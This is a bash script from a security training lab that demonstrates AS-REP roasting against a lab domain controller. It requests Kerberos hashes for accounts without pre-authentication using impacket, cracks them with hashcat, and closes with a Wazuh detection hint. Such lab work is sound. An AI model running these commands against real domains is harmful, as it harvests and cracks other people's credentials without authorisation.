#!/usr/bin/env bash
# Lab 04 — AS-REP roasting: crack accounts that don't require Kerberos pre-auth.
# MITRE ATT&CK: T1558.004 (AS-REP Roasting)
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${HERE}/../lib/common.sh"

echo "== Lab 04: AS-REP roasting =="
warn "Prerequisite: run setup-on-dc.ps1 on the DC first to disable pre-auth on an"
warn "account (default 'jsmith'). Without that, there's nothing to roast — which is"
warn "itself the lesson: this only works against misconfigured accounts."
confirm_lab
ensure_impacket || exit 1
ensure_hashcat  || true

USERFILE="$(mktemp)"; LAB_USERS_LIST > "$USERFILE"
OUT="${HERE}/asrep.hashes"

step "Ask the DC for AS-REPs without pre-auth (T1558.004)"
say "No credentials needed — that's what makes this dangerous."
impacket-GetNPUsers "${DOMAIN}/" -dc-ip "$DC_IP" -no-pass -usersfile "$USERFILE" \
  -format hashcat -outputfile "$OUT" 2>/dev/null || true
rm -f "$USERFILE"

if [[ -s "$OUT" ]]; then
  ok "Roastable hash captured:"; grep -o '\$krb5asrep\$[^ ]*' "$OUT" | head -n1 | cut -c1-80 | sed 's/$/.../'
  step "Crack it offline"
  WL="${HERE}/../03-kerberoasting/wordlist.txt"
  if have hashcat; then
    hashcat -m 18200 -a 0 "$OUT" "$WL" --potfile-disable -o "${HERE}/cracked.txt" || true
    [[ -s "${HERE}/cracked.txt" ]] && { ok "CRACKED:"; cat "${HERE}/cracked.txt"; } \
      || warn "Not cracked with the small list — use rockyou/a bigger list."
  else
    warn "hashcat not installed. Crack with: hashcat -m 18200 $OUT <wordlist>"
  fi
else
  warn "No AS-REP-roastable accounts found. Did you run setup-on-dc.ps1 on the DC?"
fi

hunt "In Wazuh (agent soc-dc01): AS-REP roasting shows as 4768 with Pre-Auth Type = 0 (none). Legitimate logons always use pre-auth, so Pre-Auth Type 0 is high-signal. See 04-asrep-roasting/DETECTION.md."
ok "Lab 04 complete."
